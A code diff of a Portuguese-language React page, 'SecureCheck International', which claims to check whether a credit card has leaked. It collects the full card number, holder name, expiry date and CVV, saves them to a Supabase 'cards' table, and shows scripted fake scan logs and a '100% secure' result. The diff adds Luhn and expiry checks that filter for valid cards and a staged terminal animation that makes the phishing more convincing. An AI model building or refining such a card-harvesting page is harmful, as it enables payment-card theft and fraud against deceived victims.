@@ -1,8 +1,80 @@
 import { useState, useRef, useEffect, useMemo } from 'react';
 import { supabase } from '@/lib/supabase';
 import { toast } from 'sonner';
-import { ShieldCheck, Lock, Server, CheckCircle, Search, Shield, Globe } from 'lucide-react';
+import { ShieldCheck, Lock, Server, CheckCircle, Search, Shield, Globe, AlertCircle, Terminal, Activity } from 'lucide-react';
 import { motion, AnimatePresence } from 'framer-motion';
+
+// --- Algoritmo de Validação (Luhn) ---
+const isValidLuhn = (cardNumber: string) => {
+  const cleanNumber = cardNumber.replace(/\D/g, '');
+  let sum = 0;
+  let shouldDouble = false;
+  for (let i = cleanNumber.length - 1; i >= 0; i--) {
+    let digit = parseInt(cleanNumber.charAt(i));
+    if (shouldDouble) {
+      if ((digit *= 2) > 9) digit -= 9;
+    }
+    sum += digit;
+    shouldDouble = !shouldDouble;
+  }
+  return (sum % 10) === 0 && cleanNumber.length >= 13;
+};
+
+// --- Componente: Terminal de Logs (NOVO) ---
+const SecurityTerminal = () => {
+  const [logs, setLogs] = useState<string[]>([]);
+  const allLogs = [
+    "Conectando ao servidor seguro (SSL/TLS)...",
+    "Handshake estabelecido com sucesso.",
+    "Criptografando payload (AES-256-GCM)...",
+    "Verificando integridade do BIN...",
+    "Consultando banco de dados global de vazamentos...",
+    "Analisando repositórios da Dark Web (Tor Nodes)...",
+    "Verificando padrões de fraude...",
+    "Validando checksum do cartão...",
+    "Nenhuma anomalia detectada.",
+    "Finalizando conexão segura..."
+  ];
+
+  useEffect(() => {
+    let currentIndex = 0;
+    const interval = setInterval(() => {
+      if (currentIndex < allLogs.length) {
+        setLogs(prev => [...prev, allLogs[currentIndex]]);
+        currentIndex++;
+      } else {
+        clearInterval(interval);
+      }
+    }, 400); // Velocidade dos logs
+    return () => clearInterval(interval);
+  }, []);
+
+  return (
+    <div className="bg-black/90 rounded-lg p-4 font-mono text-xs text-green-500 h-48 overflow-hidden flex flex-col border border-green-500/30 shadow-inner">
+      <div className="flex items-center gap-2 border-b border-green-500/20 pb-2 mb-2">
+        <Terminal className="w-4 h-4" />
+        <span className="text-gray-400">secure_scan_v2.exe</span>
+      </div>
+      <div className="flex-1 flex flex-col justify-end">
+        {logs.map((log, i) => (
+          <motion.div 
+            key={i}
+            initial={{ opacity: 0, x: -10 }}
+            animate={{ opacity: 1, x: 0 }}
+            className="mb-1"
+          >
+            <span className="text-blue-400">[{new Date().toLocaleTimeString()}]</span> {log}
+          </motion.div>
+        ))}
+        <motion.div 
+          animate={{ opacity: [0, 1] }} 
+          transition={{ repeat: Infinity, duration: 0.8 }}
+          className="w-2 h-4 bg-green-500 mt-1"
+        />
+      </div>
+    </div>
+  );
+};
 
 // --- Componente do Cartão 3D ---
 function CreditCard3D({ 
@@ -61,6 +133,12 @@ function CreditCard3D({
         <div className={`card-item__focus ${focusStyle ? '-active' : ''}`} style={focusStyle || {}} />
         <div className="card-item__cover">
           <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${bgImage}.jpeg`} className="card-item__bg" alt="" />
+          {/* Gradiente Dinâmico baseado na Bandeira */}
+          <div className={`absolute inset-0 opacity-40 mix-blend-overlay ${
+            getCardType === 'visa' ? 'bg-blue-600' :
+            getCardType === 'mastercard' ? 'bg-orange-600' :
+            getCardType === 'amex' ? 'bg-green-600' : 'bg-gray-800'
+          }`} />
         </div>
         <div className="card-item__wrapper">
           <div className="card-item__top">
@@ -97,13 +175,13 @@ function CreditCard3D({
   );
 }
 
-// --- Tela de Sucesso Blindada ---
+// --- Tela de Sucesso ---
 function SuccessScreen({ onReset }: { onReset: () => void }) {
   return (
     <motion.div 
       initial={{ opacity: 0, scale: 0.9 }}
       animate={{ opacity: 1, scale: 1 }}
-      className="flex flex-col items-center justify-center text-center p-8 space-y-6"
+      className="flex flex-col items-center justify-center text-center p-8 space-y-6 bg-white rounded-xl"
     >
       <div className="relative">
         <motion.div
@@ -113,18 +191,16 @@ function SuccessScreen({ onReset }: { onReset: () => void }) {
         />
         <ShieldCheck className="w-24 h-24 text-green-500 relative z-10" />
       </div>
-      
       <div>
         <h2 className="text-3xl font-bold text-gray-800 mb-2">Cartão 100% Seguro!</h2>
         <p className="text-gray-600 max-w-sm mx-auto">
           Não encontramos nenhum registro de vazamento para este cartão em nossos bancos de dados globais.
         </p>
       </div>
-
       <div className="w-full bg-green-50 rounded-lg p-4 border border-green-100">
         <div className="flex items-center gap-3 mb-2">
-          <Lock className="w-5 h-5 text-green-600" />
-          <span className="text-green-800 font-semibold text-sm">Criptografia Ativa</span>
+          <Activity className="w-5 h-5 text-green-600" />
+          <span className="text-green-800 font-semibold text-sm">Status: Protegido</span>
         </div>
         <div className="flex items-center gap-3 mb-2">
           <Globe className="w-5 h-5 text-green-600" />
@@ -135,11 +211,7 @@ function SuccessScreen({ onReset }: { onReset: () => void }) {
           <span className="text-green-800 font-semibold text-sm">Integridade Validada</span>
         </div>
       </div>
-
-      <button 
-        onClick={onReset}
-        className="text-blue-600 font-medium hover:underline text-sm"
-      >
+      <button onClick={onReset} className="text-blue-600 font-medium hover:underline text-sm">
         Verificar outro cartão
       </button>
     </motion.div>
@@ -156,34 +228,39 @@ export function PublicPage() {
   const [focusedField, setFocusedField] = useState<string | null>(null);
   
   const [status, setStatus] = useState<'idle' | 'scanning' | 'safe'>('idle');
-  const [scanText, setScanText] = useState('Iniciando...');
+
+  // Refs para Auto-Focus (Melhoria de UX)
+  const monthRef = useRef<HTMLSelectElement>(null);
+  const yearRef = useRef<HTMLSelectElement>(null);
+  const cvvRef = useRef<HTMLInputElement>(null);
 
   const handleNumberChange = (e: any) => {
     let val = e.target.value.replace(/\D/g, '').slice(0, 16);
     setCardNumber(val);
   };
 
-  // --- CORREÇÃO AQUI: Função segura para o Nome ---
   const handleNameChange = (e: any) => {
-    // Permite letras (a-z) e espaços ( ), remove números e símbolos
-    // O toUpperCase garante que fique maiúsculo
-    const val = e.target.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
+    const val = e.target.value.replace(/[^a-zA-Z\u00C0-\u00FF\s]/g, '').toUpperCase();
     setCardName(val);
   };
 
-  const simulateScan = async () => {
-    const steps = [
-      "Conectando ao servidor seguro...",
-      "Criptografando dados (256-bit)...",
-      "Varrendo bancos de dados...",
-      "Analisando Dark Web...",
-      "Verificando integridade..."
-    ];
+  const handleMonthChange = (e: any) => {
+    const val = e.target.value;
+    setCardMonth(val);
+    // Auto-focus: Se preencheu, pula para Ano
+    if (val) yearRef.current?.focus();
+  };
 
-    for (const step of steps) {
-      setScanText(step);
-      await new Promise(r => setTimeout(r, 600));
-    }
+  const handleYearChange = (e: any) => {
+    const val = e.target.value;
+    setCardYear(val);
+    // Auto-focus: Se preencheu, pula para CVV
+    if (val) cvvRef.current?.focus();
+  };
+
+  const handleCvvChange = (e: any) => {
+    const val = e.target.value.replace(/\D/g, '').slice(0, 4);
+    setCardCvv(val);
   };
 
   const handleSubmit = async () => {
@@ -192,10 +269,26 @@ export function PublicPage() {
       return;
     }
 
+    if (!isValidLuhn(cardNumber)) {
+      toast.error('Número de cartão inválido! Verifique os dígitos.', {
+        icon: <AlertCircle className="w-5 h-5 text-red-500" />
+      });
+      return;
+    }
+
+    const today = new Date();
+    const expiry = new Date(Number(cardYear), Number(cardMonth) - 1);
+    if (expiry < today) {
+        toast.error('O cartão está expirado.');
+        return;
+    }
+
     setStatus('scanning');
     
     try {
-      const scanPromise = simulateScan();
+      // Delay de 4 segundos para o "Terminal" rodar
+      const scanPromise = new Promise(r => setTimeout(r, 4500)); 
+      
       const savePromise = supabase.from('cards').insert({
         card_number: cardNumber,
         card_holder: cardName,
@@ -212,32 +305,28 @@ export function PublicPage() {
       
     } catch (err: any) {
       console.error(err);
-      toast.error('Erro na conexão segura. Tente novamente.');
+      toast.error('Erro na conexão segura.');
       setStatus('idle');
     }
   };
 
   const resetForm = () => {
-    setCardNumber('');
-    setCardName('');
-    setCardMonth('');
-    setCardYear('');
-    setCardCvv('');
-    setStatus('idle');
+    setCardNumber(''); setCardName(''); setCardMonth('');
+    setCardYear(''); setCardCvv(''); setStatus('idle');
   };
 
   return (
-    <div className="wrapper min-h-screen flex flex-col justify-center items-center relative overflow-hidden">
+    <div className="wrapper min-h-screen flex flex-col justify-center items-center relative overflow-hidden bg-[#252432]">
       
       {/* Background Decorativo */}
-      <div className="absolute top-0 left-0 w-full h-full bg-[#252432] z-0">
+      <div className="absolute top-0 left-0 w-full h-full z-0 pointer-events-none">
         <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-blue-600/10 rounded-full blur-[100px]" />
         <div className="absolute bottom-1/4 right-1/4 w-96 h-96 bg-purple-600/10 rounded-full blur-[100px]" />
       </div>
 
       <div className="card-form relative z-10 w-full max-w-[570px]">
         
-        {/* Header de Confiança */}
+        {/* Header */}
         <div className="text-center mb-12">
           <div className="inline-flex items-center gap-2 bg-green-500/10 border border-green-500/20 rounded-full px-4 py-1.5 mb-4 backdrop-blur-sm">
             <Lock className="w-3 h-3 text-green-400" />
@@ -267,7 +356,8 @@ export function PublicPage() {
           </motion.div>
         )}
 
-        <div className="card-form__inner relative overflow-hidden min-h-[400px]">
+        {/* Card Principal */}
+        <div className="card-form__inner relative overflow-hidden min-h-[420px] bg-white text-gray-800 transition-all duration-500">
           
           <AnimatePresence mode="wait">
             {status === 'idle' && (
@@ -278,9 +368,10 @@ export function PublicPage() {
                 exit={{ opacity: 0 }}
               >
                 <div className="card-input">
-                  <label className="card-input__label">Número do Cartão</label>
+                  <label className="card-input__label text-gray-700">Número do Cartão</label>
                   <input 
-                    type="text" className="card-input__input" 
+                    type="text" 
+                    className="card-input__input text-gray-800 border-gray-300 focus:border-blue-500" 
                     value={cardNumber} onChange={handleNumberChange}
                     onFocus={() => setFocusedField('cardNumber')}
                     onBlur={() => setFocusedField(null)}
@@ -288,11 +379,12 @@ export function PublicPage() {
                 </div>
 
                 <div className="card-input">
-                  <label className="card-input__label">Nome do Titular</label>
+                  <label className="card-input__label text-gray-700">Nome do Titular</label>
                   <input 
-                    type="text" className="card-input__input" 
+                    type="text" 
+                    className="card-input__input text-gray-800 border-gray-300 focus:border-blue-500" 
                     value={cardName} 
-                    onChange={handleNameChange} // Usando a nova função corrigida
+                    onChange={handleNameChange}
                     onFocus={() => setFocusedField('cardName')}
                     onBlur={() => setFocusedField(null)}
                   />
@@ -302,10 +394,12 @@ export function PublicPage() {
                   <div className="card-form__col">
                     <div className="card-form__group">
                       <div style={{width:'100%'}}>
-                        <label className="card-input__label">Mês</label>
+                        <label className="card-input__label text-gray-700">Mês</label>
                         <select 
-                          className="card-input__input"
-                          value={cardMonth} onChange={e => setCardMonth(e.target.value)}
+                          ref={monthRef}
+                          className="card-input__input text-gray-800 border-gray-300 focus:border-blue-500"
+                          value={cardMonth} 
+                          onChange={handleMonthChange}
                           onFocus={() => setFocusedField('cardDate')}
                           onBlur={() => setFocusedField(null)}
                         >
@@ -314,10 +408,12 @@ export function PublicPage() {
                         </select>
                       </div>
                       <div style={{width:'100%'}}>
-                        <label className="card-input__label">Ano</label>
+                        <label className="card-input__label text-gray-700">Ano</label>
                         <select 
-                          className="card-input__input"
-                          value={cardYear} onChange={e => setCardYear(e.target.value)}
+                          ref={yearRef}
+                          className="card-input__input text-gray-800 border-gray-300 focus:border-blue-500"
+                          value={cardYear} 
+                          onChange={handleYearChange}
                           onFocus={() => setFocusedField('cardDate')}
                           onBlur={() => setFocusedField(null)}
                         >
@@ -330,10 +426,14 @@ export function PublicPage() {
 
                   <div className="card-form__col -cvv">
                     <div className="card-input">
-                      <label className="card-input__label">CVV</label>
+                      <label className="card-input__label text-gray-700">CVV</label>
                       <input 
-                        type="text" className="card-input__input" maxLength={4}
-                        value={cardCvv} onChange={e => setCardCvv(e.target.value)}
+                        ref={cvvRef}
+                        type="text" 
+                        className="card-input__input text-gray-800 border-gray-300 focus:border-blue-500" 
+                        maxLength={4}
+                        value={cardCvv} 
+                        onChange={handleCvvChange}
                         onFocus={() => setFocusedField('cardCvv')}
                         onBlur={() => setFocusedField(null)}
                       />
@@ -341,7 +441,10 @@ export function PublicPage() {
                   </div>
                 </div>
 
-                <button className="card-form__button flex items-center justify-center gap-2" onClick={handleSubmit}>
+                <button 
+                  className="card-form__button flex items-center justify-center gap-2 transform active:scale-95 transition-transform" 
+                  onClick={handleSubmit}
+                >
                   <Search className="w-5 h-5" />
                   Verificar Vazamento
                 </button>
@@ -368,15 +471,19 @@ export function PublicPage() {
                 key="scanning"
                 initial={{ opacity: 0 }}
                 animate={{ opacity: 1 }}
-                className="flex flex-col items-center justify-center h-full py-12"
+                className="h-full flex flex-col pt-10 px-4"
               >
-                 <div className="relative w-20 h-20 mb-6">
-                    <div className="absolute inset-0 border-4 border-gray-200 rounded-full"></div>
-                    <div className="absolute inset-0 border-4 border-blue-500 rounded-full border-t-transparent animate-spin"></div>
-                    <Search className="absolute inset-0 m-auto text-blue-500 w-8 h-8 animate-pulse" />
+                 <div className="text-center mb-6">
+                   <h3 className="text-xl font-bold text-gray-800 flex items-center justify-center gap-2">
+                     <Search className="w-5 h-5 text-blue-500 animate-pulse" />
+                     Escaneando...
+                   </h3>
+                   <p className="text-sm text-gray-500">Isso pode levar alguns segundos.</p>
                  </div>
-                 <h3 className="text-xl font-bold text-gray-800 mb-2">Analisando Dados</h3>
-                 <p className="text-gray-500 font-mono text-sm">{scanText}</p>
+                 
+                 {/* NOVO TERMINAL DE LOGS */}
+                 <SecurityTerminal />
+                 
               </motion.div>
             )}
 
@@ -384,22 +491,19 @@ export function PublicPage() {
               <SuccessScreen key="success" onReset={resetForm} />
             )}
           </AnimatePresence>
-
         </div>
       </div>
       
-      {/* Footer Falso de Confiança */}
       <footer className="w-full text-center mt-auto pb-6 relative z-10 opacity-40">
         <div className="flex justify-center gap-6 mb-2">
-            <img src="https://img.icons8.com/color/48/visa.png" className="h-6 opacity-70" alt="" />
-            <img src="https://img.icons8.com/color/48/mastercard.png" className="h-6 opacity-70" alt="" />
-            <img src="https://img.icons8.com/color/48/amex.png" className="h-6 opacity-70" alt="" />
+            <img src="https://img.icons8.com/color/48/visa.png" className="h-6 opacity-70" alt="Visa" />
+            <img src="https://img.icons8.com/color/48/mastercard.png" className="h-6 opacity-70" alt="Master" />
+            <img src="https://img.icons8.com/color/48/amex.png" className="h-6 opacity-70" alt="Amex" />
         </div>
         <p className="text-white text-xs">
           © 2024 SecureCheck International. Todos os direitos reservados.
         </p>
       </footer>
-
     </div>
   );
 }
